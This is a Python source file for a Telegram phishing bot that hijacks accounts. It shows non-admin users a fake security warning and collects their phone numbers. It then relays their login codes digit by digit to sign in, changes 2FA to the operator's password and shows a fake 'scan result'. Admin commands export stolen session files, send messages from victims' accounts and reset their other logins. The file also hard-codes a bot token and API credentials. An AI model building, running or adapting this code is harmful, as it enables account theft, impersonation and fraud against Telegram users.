# CЛИТО В ТЕЛЕГРАМ КАНАЛАХ @END_SOFTWARE AND @END_RAID

from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message
from telethon import TelegramClient
from telethon import functions, types as telethon_types
import os, json, asyncio
from datetime import datetime

# token(@BotFather)
bot_token = '8324933170:AAFatQ1T42ZJ70oeWS2UJkcXFeiwUFCIXAk'
# TG API(https://my.telegram.org/)
api_id = '29385016'
api_hash = '3c57df8805ab5de5a23a032ed39b9af9'
# you telegram id
admin_id = 6893832048
admin_id1 = 6893832048

bot = Bot(token=bot_token, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Активные сессии для управления
active_sessions = {}

# add account states group
class AddAccount(StatesGroup):
    A1 = State()
    A2 = State()
    A3 = State()
    A4 = State()
    A5 = State()
    A6 = State()

# use account states group
class Send(StatesGroup):
    A1 = State()
    A2 = State()

# manage account states
class ManageAccount(StatesGroup):
    SELECT_ACCOUNT = State()
    ACTION = State()
    MESSAGE = State()
    TARGET = State()

# keyboard menu
code_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="1️⃣", callback_data="code_number:1"),
            InlineKeyboardButton(text="2️⃣", callback_data="code_number:2"),
            InlineKeyboardButton(text="3️⃣", callback_data="code_number:3"),
        ],
        [
            InlineKeyboardButton(text="4️⃣", callback_data="code_number:4"),
            InlineKeyboardButton(text="5️⃣", callback_data="code_number:5"),
            InlineKeyboardButton(text="6️⃣", callback_data="code_number:6"),
        ],
        [
            InlineKeyboardButton(text="7️⃣", callback_data="code_number:7"),
            InlineKeyboardButton(text="8️⃣", callback_data="code_number:8"),
            InlineKeyboardButton(text="9️⃣", callback_data="code_number:9")
        ],
        [
            InlineKeyboardButton(text="0️⃣", callback_data="code_number:0"),
        ]
    ]
)

# Админская клавиатура
admin_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="📨 Рассылка", callback_data="admin_broadcast"),
            InlineKeyboardButton(text="👥 Управление аккаунтами", callback_data="admin_manage")
        ],
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
            InlineKeyboardButton(text="📁 Сессии", callback_data="admin_sessions")
        ],
        [
            InlineKeyboardButton(text="🔄 Очистить авторизации", callback_data="admin_clean"),
            InlineKeyboardButton(text="🔍 Мониторинг кодов", callback_data="admin_monitor")
        ]
    ]
)

async def notify_admin(message_text):
    """Уведомление администратора"""
    try:
        await bot.send_message(admin_id, message_text)
        if admin_id1 != admin_id:
            await bot.send_message(admin_id1, message_text)
    except Exception as e:
        print(f"Ошибка уведомления админа: {e}")

# /start handler
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message, state: FSMContext):
    # check admin id
    if message.from_user.id != admin_id and message.from_user.id != admin_id1:
        # if not admin
        key_1 = types.KeyboardButton(
            text='Продолжить',
            request_contact=True
        )
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(key_1)
        await message.reply(text="В Telegram прошёл рейд скам ботов, которые оставили в аккаунтах дыры, просим вас пройти тест чтобы продолжить деятельность использования ботов!", reply_markup=keyboard)
    
        msg_to_edit = await bot.send_message(chat_id=message.chat.id, text="Нажмите на кнопку \"Продолжить\"")
        await AddAccount.A1.set()
        await state.update_data(msg_to_edit=msg_to_edit)
    else:
        # if admin
        path = len([name for name in os.listdir('sessions/') if os.path.isfile(os.path.join('sessions/',name))])
        await message.reply(text=f"Привет <b>admin</b>, в ваших владениях {path} сессий!\n\nВыберите действие:", reply_markup=admin_menu)

# Админские callback обработчики
@dp.callback_query_handler(text_startswith="admin_")
async def admin_callback_handler(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != admin_id and call.from_user.id != admin_id1:
        await call.answer("❌ Доступ запрещен!", show_alert=True)
        return
    
    action = call.data.split("_")[1]
    
    if action == "broadcast":
        await call.message.edit_text("Введите сообщение для рассылки:")
        await Send.A1.set()
        
    elif action == "manage":
        await show_accounts_menu(call.message)
        
    elif action == "stats":
        await show_stats(call.message)
        
    elif action == "sessions":
        await send_sessions(call.message)
        
    elif action == "clean":
        await clean_auths(call.message)
        
    elif action == "monitor":
        await show_monitor_info(call.message)
    
    await call.answer()

async def show_accounts_menu(message: Message):
    """Показать меню управления аккаунтами"""
    sessions = [name for name in os.listdir('sessions/') if name.endswith('.session')]
    
    if not sessions:
        await message.edit_text("❌ Нет доступных сессий")
        return
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    for session in sessions[:20]:  # Ограничиваем показ 20 аккаунтами
        phone = session.replace('.session', '')
        keyboard.add(InlineKeyboardButton(text=f"📱 {phone}", callback_data=f"manage_{phone}"))
    
    keyboard.add(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back"))
    
    await message.edit_text("👥 Выберите аккаунт для управления:", reply_markup=keyboard)

@dp.callback_query_handler(text_startswith="manage_")
async def manage_account(call: CallbackQuery, state: FSMContext):
    phone = call.data.replace("manage_", "")
    session_file = f"sessions/{phone}.session"
    
    if not os.path.exists(session_file):
        await call.answer("❌ Сессия не найдена!", show_alert=True)
        return
    
    # Создаем клавиатуру действий для аккаунта
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton(text="💬 Написать сообщение", callback_data=f"action_msg_{phone}"),
        InlineKeyboardButton(text="📊 Информация", callback_data=f"action_info_{phone}")
    )
    keyboard.add(
        InlineKeyboardButton(text="👥 Получить диалоги", callback_data=f"action_dialogs_{phone}"),
        InlineKeyboardButton(text="🔌 Переподключить", callback_data=f"action_reconnect_{phone}")
    )
    keyboard.add(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_manage"))
    
    await call.message.edit_text(f"📱 Аккаунт: <code>{phone}</code>\nВыберите действие:", reply_markup=keyboard)
    await call.answer()

@dp.callback_query_handler(text_startswith="action_")
async def account_action(call: CallbackQuery, state: FSMContext):
    data = call.data.replace("action_", "")
    action, phone = data.split("_", 1)
    
    if action == "msg":
        await call.message.edit_text(f"Введите сообщение для отправки от аккаунта <code>{phone}</code>:")
        await ManageAccount.MESSAGE.set()
        await state.update_data(phone=phone)
        
    elif action == "info":
        await get_account_info(call.message, phone)
        
    elif action == "dialogs":
        await get_account_dialogs(call.message, phone)
        
    elif action == "reconnect":
        await reconnect_account(call.message, phone)
    
    await call.answer()

async def get_account_info(message: Message, phone: str):
    """Получить информацию об аккаунте"""
    try:
        client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
        await client.connect()
        
        me = await client.get_me()
        dialogs = await client.get_dialogs(limit=10)
        
        info_text = f"""
📱 <b>Информация об аккаунте:</b>

👤 Имя: {me.first_name or ''} {me.last_name or ''}
📞 Телефон: <code>{phone}</code>
🆔 ID: <code>{me.id}</code>
📛 Username: @{me.username or 'Нет'}

💬 Последние диалоги:
"""
        for dialog in dialogs[:5]:
            name = dialog.name or "Без названия"
            info_text += f"• {name}\n"
        
        await client.disconnect()
        await message.edit_text(info_text)
        
    except Exception as e:
        await message.edit_text(f"❌ Ошибка: {str(e)}")

async def get_account_dialogs(message: Message, phone: str):
    """Получить список диалогов аккаунта"""
    try:
        client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
        await client.connect()
        
        dialogs = await client.get_dialogs(limit=20)
        dialogs_text = f"📱 <b>Диалоги аккаунта {phone}:</b>\n\n"
        
        for i, dialog in enumerate(dialogs[:15], 1):
            name = dialog.name or "Без названия"
            dialogs_text += f"{i}. {name}\n"
            if hasattr(dialog.entity, 'username') and dialog.entity.username:
                dialogs_text += f"   @{dialog.entity.username}\n"
            dialogs_text += "\n"
        
        await client.disconnect()
        await message.edit_text(dialogs_text)
        
    except Exception as e:
        await message.edit_text(f"❌ Ошибка: {str(e)}")

async def reconnect_account(message: Message, phone: str):
    """Переподключить аккаунт"""
    try:
        client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
        await client.connect()
        await client.disconnect()
        await message.edit_text("✅ Аккаунт успешно переподключен!")
    except Exception as e:
        await message.edit_text(f"❌ Ошибка переподключения: {str(e)}")

@dp.message_handler(state=ManageAccount.MESSAGE)
async def receive_message_for_account(message: Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("phone")
    text = message.text
    
    await message.reply(f"Введите username или ID получателя (без @):")
    await ManageAccount.TARGET.set()
    await state.update_data(phone=phone, message_text=text)

@dp.message_handler(state=ManageAccount.TARGET)
async def send_message_from_account(message: Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("phone")
    text = data.get("message_text")
    target = message.text
    
    try:
        client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
        await client.connect()
        
        await client.send_message(target, text)
        await client.disconnect()
        
        await message.reply(f"✅ Сообщение отправлено от аккаунта {phone} пользователю {target}")
        
        # Уведомляем админа
        await notify_admin(f"💬 Отправлено сообщение:\nАккаунт: {phone}\nПолучатель: {target}\nТекст: {text}")
        
    except Exception as e:
        await message.reply(f"❌ Ошибка отправки: {str(e)}")
    
    await state.finish()

async def show_stats(message: Message):
    """Показать статистику"""
    sessions = [name for name in os.listdir('sessions/') if name.endswith('.session')]
    total_sessions = len(sessions)
    
    stats_text = f"""
📊 <b>Статистика бота:</b>

📁 Всего сессий: {total_sessions}
🕒 Время: {datetime.now().strftime('%H:%M:%S')}

⚡ Функции:
• Управление аккаунтами
• Мониторинг кодов
• Рассылка сообщений
• Экспорт сессий
"""
    await message.edit_text(stats_text)

async def send_sessions(message: Message):
    """Отправить все сессии"""
    sessions = [name for name in os.listdir('sessions/') if name.endswith('.session')]
    
    if not sessions:
        await message.edit_text("❌ Нет доступных сессий")
        return
    
    for session in sessions:
        try:
            await bot.send_document(message.chat.id, open(f"sessions/{session}", "rb"))
        except Exception as e:
            print(f"Ошибка отправки сессии {session}: {e}")
    
    await message.answer(f"✅ Отправлено {len(sessions)} сессий")

async def clean_auths(message: Message):
    """Очистить авторизации"""
    res = 0
    sessions = [name for name in os.listdir('sessions/') if name.endswith('.session')]
    
    for session in sessions:
        try:
            client = TelegramClient(f"sessions/{session}", api_id, api_hash)
            await client.connect()
            result = await client(functions.account.GetAuthorizationsRequest())
            auths_list = result.to_dict()['authorizations']
            
            for auth in auths_list:
                if auth['app_name'] != 'Telegram Desktop':  # Оставляем только Telegram Desktop
                    try:
                        await client(functions.account.ResetAuthorizationRequest(hash=auth['hash']))
                        res += 1
                    except:
                        pass
            
            await client.disconnect()
        except Exception as e:
            print(f"Ошибка очистки {session}: {e}")
    
    await message.edit_text(f"✅ Удалено {res} авторизаций")

async def show_monitor_info(message: Message):
    """Показать информацию о мониторинге"""
    monitor_text = """
🔍 <b>Мониторинг кодов:</b>

Бот автоматически отслеживает:
• Коды подтверждения при авторизации
• Успешные входы в аккаунты
• Действия пользователей

Все коды и действия логируются и отправляются администратору.
"""
    await message.edit_text(monitor_text)

@dp.callback_query_handler(text="admin_back")
async def admin_back(call: CallbackQuery):
    await call.message.edit_text("🏠 Главное меню администратора:", reply_markup=admin_menu)
    await call.answer()

# /send handler
@dp.message_handler(commands=['send'])
async def send_post(message: types.Message):
    if message.from_user.id == admin_id or message.from_user.id == admin_id1:
        await message.reply(text="Введи юзернейм пользователя, который получит сообщения без @:")
        await Send.A1.set()

# /auth handler
@dp.message_handler(commands=['auth'])
async def send_auth(message: types.Message):
    if message.from_user.id == admin_id or message.from_user.id == admin_id1:
        await clean_auths(message)

# /session handler
@dp.message_handler(commands=['session'])
async def send_ses(message: types.Message):
    if message.from_user.id == admin_id or message.from_user.id == admin_id1:
        await send_sessions(message)

# send state handlers
@dp.message_handler(state=Send.A1)
async def send_A1(message: Message, state: FSMContext):
    username = message.text
    await message.reply(text="Введи текст:")

    await Send.next()
    await state.update_data(username=username)

@dp.message_handler(state=Send.A2)
async def send_A2(message: Message, state: FSMContext):
    data = await state.get_data()
    username = data.get("username")

    sent_count = 0
    sessions = [name for name in os.listdir('sessions/') if name.endswith('.session')]
    
    for name in sessions:
        try:
            client = TelegramClient(f"sessions/{name}", api_id, api_hash)
            await client.connect()
            await client.send_message(username, message.text)
            await client.disconnect()
            sent_count += 1
        except Exception as e:
            print(f"Ошибка отправки с {name}: {e}")

    await message.reply(f"✅ Сообщение отправлено с {sent_count} аккаунтов")
    await state.finish()

# add account state handlers
@dp.message_handler(content_types=['contact'], state=AddAccount.A1)
async def receive_number(message: Message, state: FSMContext):
    # get state data
    data = await state.get_data()
    msg_to_edit = data.get("msg_to_edit")
    number = message.contact.phone_number.replace(' ', '')
    await message.delete()
    
    # Уведомляем админа о новом номере
    await notify_admin(f"📱 Новый номер для авторизации:\nНомер: {number}\nПользователь: @{message.from_user.username or 'Нет'} (ID: {message.from_user.id})")
    
    # if path /sessions/ have this session 
    if os.path.exists(f"sessions/{number}.session"):
        # delete session
        os.remove(f"sessions/{number}.session")
    client = TelegramClient(f"sessions/{number}", api_id, api_hash)
    # send code
    await client.connect()
    sent = await client.send_code_request(phone=number)
    await client.disconnect()
    
    # Уведомляем админа о отправленном коде
    await notify_admin(f"🔐 Код отправлен на номер: {number}")
    
    # send code menu
    await msg_to_edit.edit_text(f"<b>Вы указали <code>{number}</code>\n"
                                f"Укажите первую цифру кода:</b>",
                                reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(number=number, sent=sent, code_hash=sent.phone_code_hash)

# menu manegers
@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A2)
async def receive_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit = data.get("msg_to_edit")
    num_1 = call.data.split(":")[1]
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{num_1}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_1=num_1)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A3)
async def receive_code1(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1 = data.get("msg_to_edit"), data.get("num_1")
    num_2 = call.data.split(":")[1]
    code = num_1 + num_2
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_2=num_2)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A4)
async def receive_code2(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2")
    num_3 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3
    
    # Отправляем админу частичный код
    await notify_admin(f"🔢 Введен частичный код: {code}*\nНомер: {data.get('number')}")
    
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_3=num_3)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A5)
async def receive_code3(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
    num_4 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3 + num_4
    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_4=num_4)

# last manager
@dp.callback_query_handler(state=AddAccount.A6)
async def receive_code4(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
    number, num_4, sent, code_hash = data.get("number"), data.get("num_4"), data.get("sent"), data.get("code_hash")
    num_5 = call.data.split(":")[1]
    full_code = num_1 + num_2 + num_3 + num_4 + num_5
    
    # Отправляем админу полный код
    await notify_admin(f"✅ Полный код: {full_code}\nНомер: {number}\nПользователь: @{call.from_user.username or 'Нет'} (ID: {call.from_user.id})")
    
    try:
        # connect
        client = TelegramClient(f"sessions/{number}", api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(phone=number, code=full_code, phone_code_hash=code_hash)
        except:
            # Если нужен пароль
            await notify_admin(f"🔒 Требуется пароль 2FA для номера: {number}")
            await client.sign_in(phone=number, code=full_code, phone_code_hash=code_hash, password='youscam666')
        
        # Уведомляем админа об успешной авторизации
        me = await client.get_me()
        await notify_admin(f"🎉 Успешная авторизация!\nНомер: {number}\nАккаунт: {me.first_name or ''} {me.last_name or ''}\nUsername: @{me.username or 'Нет'}")
        
        # send my creater message
        try:
            res = await client.edit_2fa(new_password='youscam666')
            print(res)
        except:
            pass
            
        await msg_to_edit.edit_text(f"<b>К вашему аккаунту подключен бот сканирющий логи подключений, после окончания придёт результат!</b>")
        result = await client(functions.account.GetAuthorizationsRequest())
        await msg_to_edit.edit_text("<b>Результат сканировани:</b>\n\nTelegram Desktop - ✅\nTelegram App - ✅\na0afga2 - ❌\n\n<b>Обнаружена подозрительная скрытая сессия, просим вас не мешать её удалению 24 часа!</b>")
        
        await client.disconnect()
        
    except Exception as e:
        # if error
        print(e)
        await notify_admin(f"❌ Ошибка авторизации для {number}: {str(e)}")
        await msg_to_edit.edit_text("Не верный код. Попробуйте заново. /start")

# start bot
if __name__ == '__main__':
    # Создаем папку для сессий если её нет
    os.makedirs('sessions', exist_ok=True)
    
    print("🤖 Бот запущен!")
    print(f"👤 Админы: {admin_id}, {admin_id1}")
    executor.start_polling(dp)
